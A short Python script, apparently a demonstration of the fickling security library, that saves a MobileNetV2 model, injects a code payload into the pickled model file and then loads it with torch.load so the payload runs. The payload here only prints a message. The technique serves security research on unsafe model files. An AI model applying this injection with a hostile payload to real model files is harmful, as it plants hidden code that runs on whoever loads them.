import torch
import torchvision.models as models
import warnings
from fickling.pytorch import PyTorchModelWrapper
warnings.filterwarnings("ignore")

model = models.mobilenet_v2()
torch.save(model, "mobilenet.pth")

result = PyTorchModelWrapper("mobilenet.pth")

temp_filename = "temp_filename.pt"
result.inject_payload(
    "print('Inject successful!')",
    temp_filename,
    injection="insertion",
    overwrite=True,
)

# Load file with injected payload
torch.load("mobilenet.pth")